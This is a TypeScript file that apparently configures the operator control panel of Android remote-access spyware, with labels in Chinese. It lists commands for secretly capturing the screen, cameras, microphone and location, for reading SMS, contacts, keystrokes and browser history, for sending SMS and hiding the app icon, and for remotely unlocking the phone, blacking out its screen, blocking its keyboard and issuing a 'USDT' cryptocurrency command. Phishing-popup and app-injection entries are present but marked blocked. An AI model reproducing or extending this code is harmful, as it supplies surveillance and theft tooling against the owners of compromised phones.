export interface DeviceCommand {
  blocked?: boolean;
  group: string;
  key: string;
  label: string;
  requiresInput?: boolean;
}

export const DEVICE_COMMANDS: DeviceCommand[] = [
  // 采集 — no params needed
  { group: '采集', key: 'screen', label: '屏幕快照' },
  { group: '采集', key: 'cam', label: '前置摄像头' },
  { group: '采集', key: 'backcam', label: '后置摄像头' },
  { group: '采集', key: 'camoff', label: '关闭摄像头' },
  { group: '采集', key: 'mic', label: '麦克风' },
  { group: '采集', key: 'micoff', label: '关闭麦克风' },
  { group: '采集', key: 'loc', label: '定位' },
  { group: '采集', key: 'locoff', label: '停止定位' },
  // 采集 — parameterized (handled by dedicated UI)
  { group: '采集', key: 'activz', label: '活动记录', requiresInput: true },
  { group: '采集', key: 'notifys', label: '通知流', requiresInput: true },
  { group: '采集', key: 'vapps', label: '访问应用', requiresInput: true },
  { group: '采集', key: 'vlinks', label: '访问链接', requiresInput: true },
  // 数据
  { group: '数据', key: 'SMS', label: '短信列表' },
  { group: '数据', key: 'SMSSEND', label: '发送短信', requiresInput: true },
  { group: '数据', key: 'Contacts', label: '通讯录' },
  { group: '数据', key: 'LOADAPPS', label: '应用列表' },
  { group: '数据', key: 'Keylog', label: '键盘记录' },
  {
    group: '数据',
    key: 'Logdate',
    label: '按日期键盘记录',
    requiresInput: true,
  },
  { group: '数据', key: 'Permissions', label: '权限信息', requiresInput: true },
  { group: '数据', key: 'proxy', label: '代理控制', requiresInput: true },
  { group: '数据', key: 'brows', label: '浏览器历史' },
  // 文件 (blocked)
  { blocked: true, group: '文件', key: 'files', label: '文件列表' },
  { blocked: true, group: '文件', key: 'viewfile', label: '查看文件' },
  { blocked: true, group: '文件', key: 'changefiles', label: '文件操作' },
  // 应用
  { group: '应用', key: 'OPENAPP', label: '打开应用', requiresInput: true },
  { blocked: true, group: '应用', key: 'OPENINJ', label: '注入应用' },
  { blocked: true, group: '应用', key: 'UNINSTALLAPP', label: '卸载应用' },
  { blocked: true, group: '应用', key: 'noinj', label: '取消注入' },
  { blocked: true, group: '应用', key: 'DIAO', label: '钓鱼弹窗' },
  // 维护
  { group: '维护', key: 'Hideico', label: '隐藏图标' },
  { group: '维护', key: 'rename', label: '重命名', requiresInput: true },
  { group: '维护', key: 'bc', label: '广播/通知', requiresInput: true },
];

export interface ScreenCommand {
  bstate?: string;
  comand: string;
  kbstate?: string;
  label: string;
  lockit?: string;
  navshort?: string;
  phonepasstype?: string;
  usdttype?: string;
  volstate?: string;
}

export const SCREEN_COMMANDS: ScreenCommand[] = [
  { comand: 'L', label: '点亮屏幕', lockit: '2' },
  { comand: 'L', label: '解锁屏幕', lockit: '0' },
  { comand: 'L', label: '锁定屏幕', lockit: '1' },
  { bstate: '0', comand: 'block', label: '黑屏遮挡' },
  { bstate: '1', comand: 'block', label: '取消黑屏' },
  { comand: 'nav', label: '后台键', navshort: 'rec' },
  { comand: 'nav', label: '主页键', navshort: 'ho' },
  { comand: 'nav', label: '返回键', navshort: 'bak' },
  { comand: 'vol', label: '开启静音', volstate: '0' },
  { comand: 'vol', label: '关闭静音', volstate: '1' },
  { comand: 'kb', kbstate: '2', label: '阻止键盘' },
  { comand: 'kb', kbstate: '3', label: '允许键盘' },
  { comand: 'usdt', label: 'USDT 指令', usdttype: '0' },
];
